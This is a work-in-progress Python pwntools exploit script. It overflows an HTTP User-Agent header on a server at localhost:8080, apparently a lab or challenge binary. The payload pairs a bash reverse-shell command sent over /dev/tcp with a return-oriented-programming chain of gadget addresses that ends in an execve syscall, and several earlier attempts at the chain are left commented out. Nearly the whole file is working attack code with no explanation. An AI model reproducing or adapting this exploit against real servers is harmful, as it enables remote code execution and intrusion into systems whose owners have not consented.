# WIP
from pwn import *

_memcpy = p32(0x0804b620)
_sh_addr = p32(0x080a62e0)
_buf_addr = p32(0xf7aef7d7)
_pop_pop_pop = p32(0x0804f194) # pop esi ; pop edi ; pop ebp ; ret
_jmp_esi = p32(0x0809bad3) # jmp esi
_pop_eax = p32(0x080510c6) # pop eax ; ret
_hope = p32(0x0807d964) # xor edx, edx ; mov word ptr [eax + 0x18], dx ; ret
_int11_addr = 0xf7aef7d7 + 1045 + 40 # address of 11 param for syscall

binsh = b"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1;"
useragent = binsh
useragent += b'A' * (1045 - len(binsh))
#useragent += p32(0x080510c6) # pop eax ; ret
#useragent += p32(0xf7aef7d7 + len(binsh)) # end of rshell string
#useragent += p32(0x0806329d) # mov dword ptr [eax], 0 ; mov eax, edx ; ret
useragent += p32(0x0804b361) # pop ebx ; ret
useragent += _buf_addr
useragent += _pop_eax
useragent += p32(_int11_addr - 0x18)
useragent += _hope
useragent += _pop_eax
useragent += p32(_int11_addr - 0x30) #0xf7aefbe4 ?
useragent += p32(0x08082bb7) # mov eax, dword ptr [eax + 0x2c] ; ret
useragent += p32(0x08053be5) # syscall
useragent += p32(11)


# Take #4
#useragent += p32(0xf7aefc0c) # dummy ebp
#useragent += _pop_eax
#useragent += p32(0xf7aefc0a - 0x18)
#useragent += _hope
#useragent += _memcpy
#useragent += _sh_addr
#useragent += _sh_addr
#useragent += _buf_addr
#useragent += p32(len(binsh))

# Take #3
#useragent += _memcpy
#useragent += _sh_addr
#useragent += _sh_addr
#useragent += _buf_addr
#useragent += p32(len(binsh))

# Take #2
#useragent += p32(0x080510c6) # pop eax ; ret
#useragent += p32(0xf7aef7d7 + len(binsh)) # end of /bin/sh
#useragent += p32(0x0806329d) # mov dword ptr [eax], 0 ; mov eax, edx ; ret
#useragent += p32(0x0804b6d0) # sprintf@plt
#useragent += _sh_addr
#useragent += _sh_addr # dest
#useragent += _buf_addr # format
#useragent += p32(0) # ...

# Take #1
#useragent += _memcpy
#useragent += _pop_pop_pop
#useragent += _sh_addr   # dest
#useragent += _buf_addr  # src
#useragent += p32(0x01010101) # len... fuck ...
#useragent += _jmp_esi

r = remote('localhost', 8080)
r.send(b"GET / HTTP/1.1\r\n")
r.send(b"Host: localhost:8080\r\n")
r.send(b"Accept: */*\r\n")
r.send(b"User-Agent: " + useragent + b"\r\n")
r.send(b"\r\n")

r.interactive()
